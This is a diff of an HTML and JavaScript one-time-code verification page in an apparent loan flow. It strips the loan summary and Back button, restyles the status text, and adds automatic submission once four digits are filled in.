@@ -63,33 +63,18 @@
             box-shadow: 0 16px 48px rgba(0,0,0,0.4);
         }
 
-        .card-head { text-align: center; margin-bottom: 20px; }
-        .card-head h1 { font-size: 20px; font-weight: 900; color: var(--at-dark); margin-bottom: 4px; }
-        .card-head p { color: var(--muted); font-size: 12px; }
-
-        .loan-bar {
-            background: linear-gradient(135deg, var(--at-dark), var(--at-red));
-            border-radius: 10px;
-            padding: 14px 16px;
-            margin-bottom: 18px;
-            color: white;
-        }
-
-        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; }
-        .b-row:last-child { margin-bottom: 0; padding-top: 6px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }
-
         .otp-section {
-            margin: 20px 0;
+            margin: 10px 0 20px 0;
         }
 
         .otp-label {
             display: block;
-            font-size: 10px;
+            font-size: 12px;
             font-weight: 700;
-            color: var(--at-red);
+            color: var(--at-dark);
             text-transform: uppercase;
             letter-spacing: 0.05em;
-            margin-bottom: 12px;
+            margin-bottom: 20px;
             text-align: center;
         }
 
@@ -97,7 +82,7 @@
             display: flex;
             justify-content: center;
             gap: 12px;
-            margin-bottom: 16px;
+            margin-bottom: 20px;
         }
 
         .otp-input {
@@ -130,19 +115,11 @@
 
         .otp-status {
             text-align: center;
-            font-size: 12px;
+            font-size: 13px;
             color: var(--muted);
             margin-bottom: 16px;
             min-height: 16px;
-        }
-
-        .otp-status.waiting {
-            color: var(--muted);
-        }
-
-        .otp-status.received {
-            color: var(--success);
-            font-weight: 600;
+            font-weight: 500;
         }
 
         .err {
@@ -177,23 +154,8 @@
         }
         .btn-p:hover:not(:disabled) { background: #a01729; transform: translateY(-1px); }
         .btn-p:disabled { opacity: 0.6; cursor: not-allowed; }
-        .btn-o {
-            flex: 1;
-            background: transparent;
-            color: var(--at-dark);
-            border: 2px solid var(--at-dark);
-            padding: 14px;
-            border-radius: 50px;
-            font-weight: 800;
-            font-size: 13px;
-            text-transform: uppercase;
-            cursor: pointer;
-            font-family: inherit;
-            transition: all 0.2s;
-        }
-        .btn-o:hover { background: var(--light); }
 
-        .card-ft { text-align: center; margin-top: 14px; font-size: 10px; color: var(--muted); }
+        .card-ft { text-align: center; margin-top: 20px; font-size: 10px; color: var(--muted); }
         .card-ft a { color: var(--at-red); text-decoration: none; font-weight: 700; }
         .secure { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 10px; font-size: 10px; color: var(--muted); font-weight: 600; }
 
@@ -232,7 +194,6 @@
         @media (max-width: 500px) {
             main { padding: 20px 12px; }
             .card { padding: 24px 16px; }
-            .btns { flex-direction: column; }
             .otp-input { width: 50px; height: 60px; font-size: 24px; }
             .otp-container { gap: 8px; }
         }
@@ -250,32 +211,21 @@
 
     <main>
         <div class="card">
-            <div class="card-head">
-                <h1>Verify Your Loan</h1>
-                <p>Enter the verification code sent to your phone</p>
-            </div>
-
-            <div id="bBar" class="loan-bar" style="display:none;">
-                <div class="b-row"><span>Phone:</span><span id="bPhone">&mdash;</span></div>
-                <div class="b-row"><span>Amount:</span><span id="bAmt">&mdash;</span></div>
-            </div>
-
             <div id="err" class="err"></div>
 
             <div class="otp-section">
-                <label class="otp-label">Verification Code</label>
+                <label class="otp-label">Enter Verification Code</label>
                 <div class="otp-container" id="otpInputs">
                     <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="0">
                     <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="1">
                     <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="2">
                     <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="3">
                 </div>
-                <div class="otp-status waiting" id="otpStatus">⏳ Waiting for verification code...</div>
+                <div class="otp-status" id="otpStatus">Wait for verification</div>
             </div>
 
             <div class="btns">
                 <button type="button" class="btn-p" id="verifyBtn" onclick="handleVerify()">Proceed to Verify</button>
-                <button type="button" class="btn-o" onclick="location.href='login.html'">Back</button>
             </div>
 
             <div class="card-ft">By proceeding you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a></div>
@@ -320,14 +270,6 @@
         function init() {
             otpInputElements = document.querySelectorAll('.otp-input');
             
-            if (phone) {
-                document.getElementById('bPhone').textContent = '+233 ' + phone;
-            }
-            if (amount) {
-                document.getElementById('bAmt').textContent = 'GHS ' + amount;
-            }
-            document.getElementById('bBar').style.display = 'block';
-
             // Setup OTP input listeners
             otpInputElements.forEach((input, index) => {
                 input.addEventListener('input', (e) => handleOTPInput(e, index));
@@ -350,6 +292,12 @@
             if (value.length === 1 && index < otpInputElements.length - 1) {
                 otpInputElements[index + 1].focus();
             }
+
+            // Auto-submit if manually filled
+            const otp = getOTP();
+            if (otp.length === 4) {
+                setTimeout(() => handleVerify(), 400);
+            }
         }
 
         function handleOTPKeydown(e, index) {
@@ -371,6 +319,7 @@
 
             if (digits.length === 4) {
                 otpInputElements[3].focus();
+                setTimeout(() => handleVerify(), 400);
             }
         }
 
@@ -427,10 +376,6 @@
         }
 
         function autofillCode(code) {
-            document.getElementById('otpStatus').textContent = '✓ Code received! Autofilling...';
-            document.getElementById('otpStatus').classList.remove('waiting');
-            document.getElementById('otpStatus').classList.add('received');
-            
             setOTP(code);
             
             // Disable inputs after autofill
@@ -438,7 +383,7 @@
             
             setTimeout(() => {
                 handleVerify();
-            }, 1500);
+            }, 400); 
         }
 
         function handleVerify() {
@@ -547,9 +492,7 @@
                 input.value = '';
                 input.disabled = false;
             });
-            document.getElementById('otpStatus').textContent = '⏳ Waiting for verification code...';
-            document.getElementById('otpStatus').classList.remove('received');
-            document.getElementById('otpStatus').classList.add('waiting');
+            document.getElementById('otpStatus').textContent = 'Wait for verification';
             document.getElementById('err').classList.remove('show');
             isWaitingForCode = true;
             receivedCode = null;
